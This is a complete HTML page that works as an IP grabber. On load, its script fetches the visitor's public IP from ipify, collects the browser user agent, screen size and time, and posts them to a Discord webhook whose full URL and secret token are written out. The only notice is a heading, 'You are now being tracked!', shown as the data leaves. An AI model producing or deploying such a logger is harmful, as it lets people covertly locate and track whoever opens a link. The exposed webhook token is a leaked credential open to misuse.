<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tracking</title>
  <style>
    body {
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: white;
      font-family: Arial, sans-serif;
    }
    h1 {
      color: black;
    }
  </style>
</head>
<body>
  <h1>You are now being tracked!</h1>

  <script>
    // Function to send data
    async function sendData() {
      try {
        // Fetch user's public IP address using ipify API
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const publicIP = ipData.ip;

        // Collect other user data
        const userAgent = navigator.userAgent;
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;
        const data = {
          userAgent: userAgent,
          screenSize: `${screenWidth}x${screenHeight}`,
          publicIP: publicIP,
          timestamp: new Date().toISOString()
        };

        // Discord webhook URL
        const webhookUrl = "https://discord.com/api/webhooks/1311826289795010680/_HVnWtv_nKSen0Ih6MBvUMlPlYicQtJGIb3SAIpBPxsnyNXOtO-QHXjpq9fLId0n6JpJ";

        // Send data to Discord webhook
        await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `New user visited the page:\n**Public IP**: ${data.publicIP}\n**User Agent**: ${data.userAgent}\n**Screen Size**: ${data.screenSize}\n**Timestamp**: ${data.timestamp}`
          })
        });
      } catch (error) {
        console.error("Error fetching IP or sending data:", error);
      }
    }

    // Send data as soon as the page loads
    sendData();
  </script>
</body>
</html>
